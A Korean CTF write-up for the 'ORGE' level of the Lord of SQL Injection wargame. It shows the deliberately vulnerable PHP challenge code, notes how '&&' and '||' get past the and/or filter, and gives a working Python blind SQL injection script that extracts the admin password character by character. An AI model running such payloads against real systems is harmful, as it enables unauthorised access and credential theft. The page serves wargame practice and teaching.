---
layout: default
title: ORGE
parent: Load Of SQL Injection
nav_order: 7
---

# ORGE

and와 or 연산자를 각각 &&, || 으로 우회해 Blind SQL Injection으로 PW를 구하면 된다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

Python 툴을 짜 해결할 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw='|| length(pw)=%d %%26%%26 instr(id,'admin')%%23"%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("Hello admin",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        hexkey=hex(subkey);
	if hexkey=="0x25":
		subkey=subkey+1
		hexkey=hex(subkey)
        url="https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw='|| substr(pw,%d,1)=%s %%26%%26 instr(id,'admin')%%23" %(lenck,hexkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            print 'find'
            key=key+chr(subkey)
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```